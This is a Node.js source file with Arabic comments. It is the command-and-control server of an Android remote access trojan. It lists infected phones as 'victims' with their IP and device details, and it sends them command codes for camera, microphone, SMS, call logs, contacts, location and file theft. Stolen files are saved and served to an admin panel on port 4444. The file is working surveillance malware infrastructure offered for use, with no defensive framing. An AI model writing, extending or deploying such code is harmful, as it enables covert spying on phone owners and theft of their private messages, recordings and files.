const express = require('express');
const app = express();
const http = require('http').Server(app);
const io = require('socket.io')(http);
const path = require('path');
const fs = require('fs-extra');
const victimsList = require('./Victim');

// إعدادات المجلدات
const DOWNLOADS_DIR = path.join(__dirname, 'downloads');
fs.ensureDirSync(DOWNLOADS_DIR);

// متاح للوصول من المتصفح لتشغيل الملفات الصوتية
app.use('/downloads', express.static(DOWNLOADS_DIR));

// أوامر التحكم
const orders = {
    camera: 'x0000ca',
    fileManager: 'x0000fm',
    calls: 'x0000cl',
    sms: 'x0000sm',
    mic: 'x0000mc',
    location: 'x0000lm',
    contacts: 'x0000cn',
};

// تشغيل واجهة الويب
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// تنظيف قائمة الضحايا قبل الإرسال لتجنب تعليق السيرفر
function getSafeVictimsList() {
    const allVictims = victimsList.getVictimList();
    const safeList = {};
    for (let id in allVictims) {
        safeList[id] = {
            id: allVictims[id].id || id,
            ip: allVictims[id].ip,
            model: allVictims[id].model,
            manf: allVictims[id].manf,
            release: allVictims[id].release
        };
    }
    return safeList;
}

io.on('connection', (socket) => {
    const query = socket.handshake.query;

    // حدث لتحديث القائمة يدوياً من اللوحة
    socket.on("upv", (d) => {            
        io.emit('update_victims', getSafeVictimsList());
    });

    // إذا كان المتصل "ضحية"
    if (query.id) {
        const address = socket.request.connection;
        const ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
        
        victimsList.addVictim(socket, ip, address.remotePort, 'Unknown', query.manf, query.model, query.release, query.id);
        console.log(`[+] ضحية متصل الآن: ${query.model} | IP: ${ip}`);
        
        // إرسال تحديث فوري للوحة التحكم
        io.emit('update_victims', getSafeVictimsList());

        // استقبال البيانات
        socket.on(orders.sms, (data) => io.emit('data_received', { type: 'SMS', content: data }));
        socket.on(orders.contacts, (data) => io.emit('data_received', { type: 'Contacts', content: data }));
        
        socket.on(orders.fileManager, (data) => {
            if (data.file === true) {
                const filePath = path.join(DOWNLOADS_DIR, data.name);
                fs.outputFile(filePath, data.buffer, (err) => {
                    if (err) {
                        io.emit('log', 'Error saving file: ' + data.name);
                    } else {
                        io.emit('log', 'File saved: ' + data.name);
                        // إرسال تنبيه للمتصفح لتشغيل الملف إذا كان MP3
                        io.emit('file_ready', {
                            name: data.name,
                            url: '/downloads/' + encodeURIComponent(data.name),
                            isAudio: data.name.toLowerCase().endsWith('.mp3')
                        });
                    }
                });
            }
            io.emit('data_received', { type: 'Files', content: data });
        });

        socket.on('disconnect', () => {
            console.log(`[-] انقطع اتصال: ${query.id}`);
            io.emit('update_victims', getSafeVictimsList());
        });
    }

    // استقبال الأوامر من الأدمن
    socket.on('admin_command', (cmd) => {
        const allVictims = victimsList.getVictimList();
        const target = allVictims[cmd.targetId];
        
        if (target && target.socket) {
            console.log(`[!] إرسال أمر ${cmd.type} إلى ${cmd.targetId}`);
            target.socket.emit('order', { 
                order: orders[cmd.type], 
                extra: cmd.extra, 
                path: cmd.path, 
                to: cmd.to, 
                sms: cmd.msg 
            });
        } else {
            socket.emit('log', 'الضحية غير متصل حالياً');
        }
    });
});

const PORT = 4444;
http.listen(PORT, () => {
    console.log(`-----------------------------------------`);
    console.log(`لوحة التحكم: http://localhost:${PORT}`);
    console.log(`-----------------------------------------`);
});